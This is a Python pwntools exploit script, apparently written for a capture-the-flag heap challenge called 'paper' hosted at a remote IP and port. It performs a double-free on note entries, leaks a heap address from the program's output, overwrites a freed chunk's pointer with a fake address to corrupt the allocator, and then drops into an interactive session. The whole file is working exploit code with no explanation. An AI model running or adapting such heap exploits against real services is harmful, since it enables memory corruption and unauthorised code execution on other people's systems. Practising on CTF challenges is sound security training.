from pwn import *
libc = ELF("./libc/libc.so.6")
#p = process("./paper")
p = remote("81.70.195.166","10003")
context.log_level = "debug"

def dbg():
    gdb.attach(p)
    pause()

def choice(num):
    p.sendlineafter(">",str(num))

def newf():
    choice(1)

def new(id,context=10):
    choice(3)
    p.sendlineafter(":",str(id))
    p.sendlineafter(":",str(context))

def leak_addr():
    choice(4)

def delete(id):
    choice(2)
    p.sendlineafter(":",str(id))

newf()
newf()
newf()

new(0)
new(1)
new(2)

delete(1)
delete(2)
delete(1)

leak_addr()
p.recvuntil("Your disk is at: 0x")
fake_addr = int(p.recv(12),16)

log.info("fake_addr --> "  + str(hex(fake_addr)))
#dbg()

p.sendlineafter(">",str(5))
p.sendline("32")

newf()
new(3,str(fake_addr-8))
newf()

newf()
newf()
new(6,str(int('CCCCCCCC',16)))


p.sendlineafter(">",str(6))

p.interactive()